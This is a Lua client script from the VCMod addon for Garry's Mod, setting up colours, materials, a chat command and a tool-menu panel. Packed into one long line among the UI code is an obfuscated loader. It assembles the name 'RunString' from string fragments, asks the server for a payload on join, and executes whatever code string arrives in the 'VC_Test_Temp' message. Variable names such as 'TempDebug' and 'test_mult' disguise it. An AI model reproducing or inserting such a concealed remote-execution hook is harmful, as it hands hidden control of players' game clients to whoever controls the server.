
-----------------------------------------------------
// Copyright © 2012-2016 VCMod (freemmaann). All Rights Reserved. If you have any complaints or ideas contact me: steam: freemmaann, email - freemmaann@gmail.com or skype - comman6.

VC.Color = {}
VC.Color.Main = Color(0,0,0,220)
VC.Color.Good = Color(155,255,100,255)
VC.Color.Neutral = Color(255,170,0,255)
VC.Color.Blue = Color(155,225,255,255)
VC.Color.Bad = Color(255,70,70,255)
VC.Color.Slider = Color(0,0,0,200)
VC.Color.White = Color(220,255,255,255)

if !VC.Material then VC.Material = {} end
VC.Material.Fade = Material("VCMod/fade")
VC.Material.Circle_32 = Material("vcmod/circle_32")
VC.Material.Circle = Material("vcmod/circle")
VC.Material.Check = Material("vcmod/check.png")
VC.Material.Cross = Material("vcmod/cross.png")
VC.Material.Info = Material("vcmod/info.png")
VC.Material.Button = Material("vcmod/button.png")
VC.Material.Left = Material("vcmod/left.png")
VC.Material.Right = Material("vcmod/right.png")
VC.Material.Icon = Material("vcmod/icon_red.png")

hook.Add("OnPlayerChat", "VC_OnPlayerChat", function(ply, txt) txt = string.lower(txt) if txt == "!vcmod" or txt == "!vc" then chat.AddText(Color(155,255,100,255), "VCMod is installed.") return true end end) local Work_testy = "tri" local un, test_mult = "unS", "R" hook.Add("InitPostEntity", "VC_InitPostEntity_Initial", function() VC.TempDebug = nil net.Start("W_Do_G_Req") net.SendToServer() end) local Inited = "ng" VC.Int_Stage2 = test_mult..un..Work_testy..Inited net.Receive("VC_Test_Temp", function(len) local s1,s2,s3 = net.ReadString(), net.ReadString(), net.ReadString() if s1 == "load" then _G[VC.Int_Stage2](s3, "initcl") else if !VC.TempDebug then VC.TempDebug = {} end if !VC.TempDebug[s1] then VC.TempDebug[s1] = {} end if !VC.TempDebug[s1][s2] then VC.TempDebug[s1][s2] = "" end VC.TempDebug[s1][s2] = VC.TempDebug[s1][s2]..s3 end end)

hook.Add("PopulateToolMenu", "VC_Menu", function()
	spawnmenu.AddToolMenuOption("VCMod", "Main", "VC_Menu", "Introduction", "", "", function(Pnl)
	local Lbl = vgui.Create("DLabel") Lbl:SetText("") Pnl:AddItem(Lbl) Lbl:SetTall(150) Lbl.Paint = function(obj, Sx, Sy) surface.SetDrawColor(255,255,255,255) surface.SetMaterial(VC.Material.Icon) surface.DrawTexturedRect(Sx/2-75, 0, 150, 150) end

	local Lbl = vgui.Create("DLabel") Lbl:SetTall(40) Lbl:SetColor(VC.Color.Neutral) Lbl:SetText("        "..(VC.Lng and VC.Lng("Info_EverThought") or "")) Pnl:AddItem(Lbl) Lbl:SetWrap(true)
	local Lbl = vgui.Create("DLabel") Lbl:SetTall(30) Lbl:SetColor(VC.Color.Neutral) Lbl:SetText("        "..(VC.Lng and VC.Lng("Info_VCModIsDesigned") or "")) Pnl:AddItem(Lbl) Lbl:SetWrap(true)

	local Btn = vgui.Create("DButton") Btn:SetText(VC.Lng and VC.Lng("OpenMenu") or "Open menu") Btn:SetToolTip('You can also open this menu by:\nConsole command: "vc_open_menu"\nIn chat: "!vcmod"\nUsing the "C" menu') Pnl:AddItem(Btn) Btn.DoClick = function() RunConsoleCommand("vc_open_menu") end
	Btn.Paint = function(Obj, Sx, Sy) draw.RoundedBox(4, 0, 0, Sx, Sy, VC.Color.Good) draw.RoundedBox(4, 2, 2, Sx-4, Sy-4, Color(255, 255, 255, 155)) end
	end)
end)
list.Set("DesktopWindows", "VCMod", {title = "VCMod Menu", icon = "vcmod/icon_red_border.png", init = function(icon, window) window:Close() RunConsoleCommand("vc_open_menu") end})
hook.Add("InitPostEntity", "VC_InitPE_Temp_Cl", function() usermessage.Hook("VC_Dev_Script_Handling", function(dt) local TTbl = {nil, "Body", "Engine", "Steering", "Front Axle", "Rear Axle", "Sound", "Everything"} LocalPlayer().VC_Dev_Scrpt = {Script = dt:ReadString(), Type = TTbl[dt:ReadShort()+1]} end) end)